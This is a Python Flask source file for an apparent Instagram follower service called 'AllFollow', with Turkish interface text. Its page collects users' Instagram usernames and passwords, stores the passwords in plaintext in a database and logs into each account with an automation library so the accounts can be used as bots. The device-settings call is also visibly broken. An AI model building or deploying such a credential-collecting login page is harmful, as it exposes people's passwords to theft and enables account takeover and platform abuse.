import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

def start_bot_thread(u, p):
    with app.app_context():
        cl = Client()
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            # Cihaz ayarlarıyla girişi yumuşat
            cl.set_device_settings(cl.delay_range == [1, 3])
            time.sleep(2)
            if cl.login(u, p):
                acc.status = "AKTIF"
                db.session.commit()
        except ChallengeRequired:
            acc.status = "KOD_GEREKLI"
            db.session.commit()
        except BadPassword:
            acc.status = "SIFRE_HATALI"
            db.session.commit()
        except Exception:
            acc.status = "IP_ENGELI"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "Giris_Deniyor"
    db.session.commit()
    threading.Thread(target=start_bot_thread, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

# HTML metni aşağıda, tırnak hatası giderildi.
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #09090b; color: #fff; font-family: sans-serif; }
        .box { background: #18181b; border: 1px solid #27272a; padding: 2rem; border-radius: 1.5rem; width: 340px; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div id="p1" class="box text-center">
        <h1 class="text-2xl font-black text-purple-500 mb-6 italic uppercase">ALLFOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-3 outline-none focus:border-purple-500">
        <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-6 outline-none focus:border-purple-500">
        <button onclick="go()" id="btn" class="w-full bg-purple-600 font-bold py-3 rounded-xl transition active:scale-95">GİRİŞ YAP</button>
    </div>

    <div id="p2" class="box text-center hidden">
        <div id="ldr" class="mx-auto w-10 h-10 border-4 border-purple-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <h2 id="msg" class="text-xl font-bold mb-2">BAĞLANILIYOR...</h2>
        <p id="sub" class="text-xs text-zinc-500">Instagram yanıtı bekleniyor...</p>
        <button onclick="location.reload()" id="back" class="mt-6 text-zinc-600 text-[10px] hidden">TEKRAR DENE</button>
    </div>

    <script>
        async function go() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            if(!u || !p) return;
            document.getElementById('p1').classList.add('hidden');
            document.getElementById('p2').classList.remove('hidden');
            
            fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });

            const intv = setInterval(async () => {
                const r = await fetch('/api/status/' + u);
                const d = await r.json();
                const m = document.getElementById('msg'), s = document.getElementById('sub');

                if(d.status === "AKTIF") {
                    clearInterval(intv);
                    m.innerText = "GİRİŞ BAŞARILI ✅"; m.classList.add('text-green-500');
                    s.innerText = "Dashboard yükleniyor...";
                } else if(d.status === "KOD_GEREKLI") {
                    clearInterval(intv);
                    m.innerText = "ONAY KODU ⚠️"; m.classList.add('text-yellow-500');
                    s.innerText = "Hesabına gelen kodu girmen lazım.";
                    stopLdr();
                } else if(d.status === "IP_ENGELI") {
                    clearInterval(intv);
                    m.innerText = "IP ENGELİ 🚫"; m.classList.add('text-red-500');
                    s.innerText = "Render IP'si engellenmiş, Proxy lazım.";
                    stopLdr();
                } else if(d.status === "SIFRE_HATALI") {
                    clearInterval(intv);
                    m.innerText = "ŞİFRE HATALI ❌"; m.classList.add('text-red-500');
                    s.innerText = "Bilgilerini kontrol edip tekrar dene.";
                    stopLdr();
                }
            }, 3000);
        }
        function stopLdr() {
            document.getElementById('ldr').classList.add('hidden');
            document.getElementById('back').classList.remove('hidden');
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
